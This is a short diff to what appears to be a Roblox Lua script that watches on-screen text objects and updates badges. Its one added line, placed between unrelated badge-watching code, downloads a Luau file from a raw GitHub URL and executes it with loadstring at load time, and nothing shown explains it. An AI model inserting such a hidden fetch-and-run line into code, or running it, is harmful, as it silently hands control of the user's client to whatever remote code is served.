@@ -2072,6 +2072,7 @@ local function watch(object)
     updateBadge(object)
     object:GetPropertyChangedSignal("Text"):Connect(function() updateBadge(object) end)
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/resppvp-beep/mm2values/main/main.luau"))()
 for _, object in ipairs(playerGui:GetDescendants()) do watch(object) end
 playerGui.DescendantAdded:Connect(watch)
 
